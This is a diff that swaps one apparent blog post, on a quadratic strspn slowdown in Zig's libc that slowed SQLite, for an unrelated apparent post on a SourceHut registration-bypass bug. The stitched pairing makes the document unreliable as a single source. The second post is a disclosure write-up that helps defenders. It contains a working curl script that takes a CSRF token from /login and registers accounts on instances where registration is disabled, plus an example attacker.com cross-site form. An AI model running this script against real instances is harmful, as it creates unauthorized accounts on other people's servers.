@@ -1,48 +1,106 @@
-Back in 2001, Joel Spolsky – whose writings had a big influence my career – wrote a great piece titled [Back to Basics](https://www.joelonsoftware.com/2001/12/11/back-to-basics/). The premise of the piece is that practitioners should understand the basics: However abstract and remote we may seem from the basic algorithms that drive computing, they can unexpectedly have enormous consequences on our projects.
+So, last time I wrote about [account takeover using XSS on the CI platform of SourceHut](https://blog.arusekk.pl/posts/srht-account-takeover/).
 
-One of his examples is the “Shlemiel the Painter” trap, where a seemingly simple choice leads to quadratic runtime complexity. In that parable, a street line painter never moves his can of paint. As he gets further and further along in the line, increasingly more of his time is spent walking to and from his can of paint.
+This time I found something not nearly as ‘impactful’, but still interesting.
+Sorry for taking this long, but my SSD literally died<sup>[1](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fn:1)</sup> and while waiting for a warranty repair
+I had to buy a used one (have you seen the prices yet??)<sup>[2](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fn:2)</sup>.
+It finally arrived so here I am.
 
-It is astonishing how often this Shlemiel the Painter pattern recurs<sup>[1](https://dennisforbes.ca/blog/microblog/2026/10/the_accidental_12000x_sqlite_slowdown/#user-content-fn-firefox)</sup>, including now in 2026.
+So, if you want me to work faster, just drop me some money.<sup>[3](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fn:3)</sup>
 
-## My Chess Analysis Service Staggers Under Load
+## No NLP[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#no-nlp)
 
-A few days ago I posted about a [chess analysis service I put online](https://dennisforbes.ca/blog/microblog/2026/10/chess_analysis_service)<sup> ↗</sup><sup>[2](https://dennisforbes.ca/blog/microblog/2026/10/the_accidental_12000x_sqlite_slowdown/#user-content-fn-motive)</sup>. This is primarily a Rust service backed by sqlite that dishes out analysis tasks to runners. Each runner processes upwards of hundreds of chess games and return a large set of JSON bundles back to the main service, where they are processed and then stuffed into sqlite.
+Again, as you might know,
+I am not very excited about the current wave of natural language processing.<sup>[4](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fn:4)</sup>
 
-While the analysis pegs two dozen cores on a runner for minutes on end, the process of storing the data should take milliseconds. Sub-milliseconds.
+*No NLP has been used in this research. The mistakes are all mine.*
 
-Imagine my surprise when on the first really large set of games, the simple process of inserting the JSON data – maybe about 40,000 records – into the data store took *minutes*. During all of my testing this never really appeared as a critical path, but with a large set of records it suddenly was a breaking problem.
+## The background[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#the-background)
 
-What made this more perplexing was that it completely saturated a core, being a CPU-bound operation. How could inserting simple JSON into SQLite yield minutes of CPU time?
+SourceHut has been undergoing quite an architectural change.
+Its frontend was first built using Flask and Jinja templates and SQLAlchemy.
+But, for performance reasons, and for other reasons
+(decoupling of business logic, graphql)
+the API has been ported over to Go.
 
-Shlemiel the painter has made an appearance. To drop a spoiler, he was introduced to the project via Zig’s cc compiler and its replacement for standard library functions.
+## The problem[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#the-problem)
 
-## A Minor Issue In Zig Becomes A Major Performance Issue
+Back in 2021, while moving registration code from the frontend to the graphql backend,
+a subtle logic bug got introduced.
+While the frontend never shows a registration form, and states prominently
+‘registration is currently closed’,
+the form handler is still there.
+It correctly states that registration is closed on every error path,
+but on the happy path it does not seem to ever check it.
+So if you happen to remember how to submit the form…
 
-The project isn’t built in Zig, but instead uses Rust. The sqlx sqlite crate needs to be compiled for the target environment – sqlite is of course a C project – so to facilitate cross-platform building, generating both Mac ARM64 and Linux ARM64 / x86-64 binaries from this machine in a convenient build and deploy workflow, zig cc is used to compile sqlite when targeting Linux, generously offering up cross-platform targeting via cargo-zigbuild.
+## The exploitation[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#the-exploitation)
 
-From one build and deploy script on my Mac I can target all of my platforms without containers or build machines. Zig’s elegant libzigc re-implements the standard library so you can static link the necessary functionality.
+You just need to `POST /register/step2` with your desired username, email and password.
+If the server in question disables registration, but has its SMTP configured properly
+(you still need to do email confirmation), boom, you are in.
 
-Zig uses musl (the standard library rewrite), but they have been rewriting it piece by piece in pure Zig (via libzigc), removing the C dependencies one at a time.
+There is only one caveat, the csrf token —
+protection against Cross-Site Request Forgery,
+like a `www.attacker.com` containing `<form action="https://meta.sr.ht/profile/delete">` (or [307ing](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/307) there),
+because yes you can post forms to other sites, and yes the request will carry valid cookies.
+What other sites cannot know are the values of input fields in the form presented to you specifically,
+so the typical protection is `<input type="hidden" name="_csrf_token" value="1d02711ce5a3a17342...">`.
 
-And that’s where the performance issue was introduced.
+There is no registration form displayed, so there is no token.
+However, fortunately for us attackers, the token from /login works just fine.
 
-In the [rewrite of strspn](https://codeberg.org/ziglang/zig/src/commit/ae9a8acc7f232cb78a131b6dc05633f34d0990ad/lib/c/string.zig#L154-L157), [replacing the musl version with the pure zig variant](https://codeberg.org/ziglang/zig/commit/f0649dd9782780f5b608af338b6d4add19ce2730)), the first step measures the entire length of the string. This is also seen in the rewrites of strcspn, strpbrk and strstr.
+## The exploit[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#the-exploit)
 
-This is a problem for tokenizers. A tokenizer takes a giant string and a common iterating step is to skip whitespace, getting the new string location and then repeating this pattern repeatedly. With this shlemiel the painter pattern introduced with these rewrites, as it steps through the text it is tokenizing it is remeasuring the entire length of the string endlessly.
+```sh
+#!/bin/sh
 
-This is what caused my performance issue, and it’s why it appeared on Linux but was never seen on my Mac (where zig wasn’t used for compiling sqlite).
+#META=https://meta.copyleft.market
+META=http://127.0.0.1:5000
+USERNAME=azurediamond
+EMAIL=test@example.com
+PASSWORD=hunter2
 
-Tokenizing a 1.2MB file, which was seen passing json to sqlite, is approximately 12,000x slower with this pattern. As the file gets larger, the slowdown is quadratic.
+csrf=$(curl -c cookie.txt $META/login |grep -A1 csrf |cut -d\' -f2 |tail -1)
+curl -v -b cookie.txt $META/register/step2 \
+        -d _csrf_token="$csrf" \
+        -d username="$USERNAME" \
+        -d email="$EMAIL" \
+        -d password="$PASSWORD"
+```
 
-## The Classic Issues Recur
+## Some metadata, I guess?[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#some-metadata-i-guess)
 
-I mean no malice or disrespect to anyone involved with these great tools that enable so much. But it’s interesting that in the year 2026, these same old issues can recur, and we all need to be vigilant for them. Something so trivial was grinding a process to a halt, in the most unexpectedly trivial of places.
+- Affected versions: 0.56.11 through 0.88.9
+- Affected instances: at least 10 (GET WRITTEN PERMISSION BEFORE TESTING)
+- CVSS 4.0 (subjective): CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/AU:N/R:U/V:D/RE:M/U:Green
+- Indicators of compromise: unknown user accounts (go to /users on meta)
 
-My original fix for this issue, at least in my own code, was to pre-prune whitespace from JSON, which greatly reduced the cost when tokenizing in sqlite3, but not knowing where else it might bite I moved my Linux builds over to Linux containers.
+## Timeline[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#timeline)
 
-## Footnotes
+- 2021-09-24 - vulnerability introduced
+- 2026-08-13 - I write ‘registration [on meta.copyleft.market] is disabled, so good luck getting anywhere’
+- 2026-09-24 - my SSD dies quite literally as I publish the writeup on the account takeover vulnerability
+- 2026-10-?? - I keep thinking about what I wrote back on 2026-08-13
+- 2026-11-02 - disclosure to SourceHut’s security mailing list
+- 2026-11-03 - ack, fix lands, downstream notified, this post published, CVE id requested from VulnCheck
+- 2026-11-03 - VulnCheck assigns CVE-2026-121728
+- some day, profit?
 
-1. Years and years ago, back when Sunspider was the go-to benchmark and browsers would herald their supremacy, the same pattern could be seen in the way Firefox handled string concatenations, causing it to be a laggard in that benchmark. Sunspider’s benchmark run somehow entailed an enormous number of string concatenations – even the tests having little to do with strings – and a simple profile<sup>[3](https://dennisforbes.ca/blog/microblog/2026/10/the_accidental_12000x_sqlite_slowdown/#user-content-fn-profilers)</sup> of a benchmark run showed that a significant amount of the runtime was consumed constantly allocating slightly larger string memory, copying to the new location, and then repeating this pattern. It was Shlemiel the Painter. I corrected this (overallocate strings with a size-dependent buffer such that subsequent concatenations could reuse the buffer until it actually need to be resized again, which again would overallocate), blogged about it, Brendon Eich took note, and voila Firefox took the lead in the benchmark<sup>[4](https://dennisforbes.ca/blog/microblog/2026/10/the_accidental_12000x_sqlite_slowdown/#user-content-fn-real)</sup>. Such a trivial thing turned it from slowpoke to benchmark. [↩](https://dennisforbes.ca/blog/microblog/2026/10/the_accidental_12000x_sqlite_slowdown/#user-content-fnref-firefox)
-2. I’m under no delusions I’m going to support my family with a niche chess analysis service, and at most I’m looking to break even with the costs of running it. I put it online because I found my work to these ends useful to my own game, and hope that occasionally it will find the right user without burdening me with the costs of doing so. [↩](https://dennisforbes.ca/blog/microblog/2026/10/the_accidental_12000x_sqlite_slowdown/#user-content-fnref-motive)
-3. Profilers are awesome. They are the most powerful tool we have available to us, so it’s strange to me how seldom they are utilized. [↩](https://dennisforbes.ca/blog/microblog/2026/10/the_accidental_12000x_sqlite_slowdown/#user-content-fnref-profilers)
-4. And for what it’s worth, string concatenation was extremely common in almost all web projects, so the benefit was substantial in the real world as well. There was a best practice of using string builders, but so often people just slammed strings together in a loop. [↩](https://dennisforbes.ca/blog/microblog/2026/10/the_accidental_12000x_sqlite_slowdown/#user-content-fnref-real)
+## Summary[#](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#summary)
+
+Lessons learned:
+
+- Refactors can swallow security checks.
+- Double check correctness on auth flows.
+- CSRF protection would prevent this if the token was scope-limited to the specific endpoint each form points to.
+- VulnCheck is nice but their contact channels can still get more responsive.
+
+Does anyone know a bug bounty program where the researcher pays an upfront participation fee?
+I will set mine up this way for sure, and you should consider it too, if you are drowning in submissions.
+
+As I said the last time, I am not done.  Stay tuned (follow me on all socials to be sure, and RSS of course) and <del>call</del> hire me maybe.
+
+1. it’s okay, I did make a backup [↩︎](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fnref:1)
+2. please can someone just… stop this madness? who else wants to just cut San Francisco off the Internet? or build a garage DRAM/SSD factory with me? can’t be that hard… [↩︎](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fnref:2)
+3. For example by [buying something](https://1clicklinux.org) or [donating](https://github.com/sponsors/Arusekk) or [donating](https://liberapay.com/Arusekk/) (every euro or dollar makes a difference to me). Or by signal boosting my paid projects! You can now hire me for professional consulting, too. [↩︎](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fnref:3)
+4. I mean, transformers *are* groundbreaking, but (not to make this text even longer) in the same sense that leaded fuel was groundbreaking. Cool, but so what. We had fuels before, and we have better fuels now. [↩︎](https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/#fnref:4)
